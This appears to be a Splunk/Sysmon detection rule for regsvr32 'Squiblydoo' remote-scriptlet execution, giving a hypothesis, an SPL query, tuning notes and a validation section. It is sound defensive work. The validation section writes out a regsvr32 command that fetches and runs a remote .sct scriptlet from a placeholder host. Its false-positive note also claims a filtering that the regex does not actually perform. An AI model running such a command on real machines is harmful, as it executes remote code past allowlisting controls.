---
id: win_sysmon_t1218.010_regsvr32_remote
title: Regsvr32.exe with remote scriptlet (Squiblydoo)
status: testing
author: LordMonstey
created: 2026-04-28
modified: 2026-04-28
severity: high
risk_score: 70
attack:
  - tactic: defense-evasion
    technique: T1218.010
    sub_technique_name: Regsvr32
data_source:
  index: sysmon
  sourcetype: XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
  event_codes: [1]
mitre_data_component: Process Creation
schedule:
  cron: "*/5 * * * *"
  earliest: "-10m@m"
  latest:   "-1m@m"
references:
  - https://attack.mitre.org/techniques/T1218/010/
  - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
  - https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
tags:
  - lolbin
  - defense-evasion
  - squiblydoo
---

## Hypothesis

The "Squiblydoo" technique abuses `regsvr32.exe /s /n /u /i:<URL> scrobj.dll` to download and execute remote scriptlets, bypassing application allowlisting because regsvr32 is Microsoft-signed. Legitimate regsvr32 invocations register or unregister local DLLs and never reach out to the internet.

## Logic

```spl
`sysmon_process_creation`
process_name="regsvr32.exe"
| where match(CommandLine, "(?i)https?://|/i:.+\\\\.+|scrobj\.dll")
| `cim_endpoint_processes_rename`
| stats count min(_time) as firstTime max(_time) as lastTime
        values(CommandLine) as commandlines
        values(parent_process_name) as parents
        by dest user process_name process_guid
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
```

## Known false positives

- Practically none on a workstation. On a build server or CI runner, registry DLL builds may emit benign `scrobj.dll` invocations against local paths — already filtered by the URL/UNC pattern

## Tuning

- The URL/UNC filter is the gate. Do not loosen it.
- Suppression: 1 hour per `(dest, process_guid)`

## Validation

- Atomic Red Team: T1218.010 #1 — Regsvr32 remote COM scriptlet execution

Manual reproduction (replace URL with a controlled test endpoint):

```cmd
regsvr32.exe /s /n /u /i:https://example.com/atomic-test.sct scrobj.dll
```

## Response

See [`docs/runbooks/lolbin-proxy-execution.md`](../docs/runbooks/lolbin-proxy-execution.md).
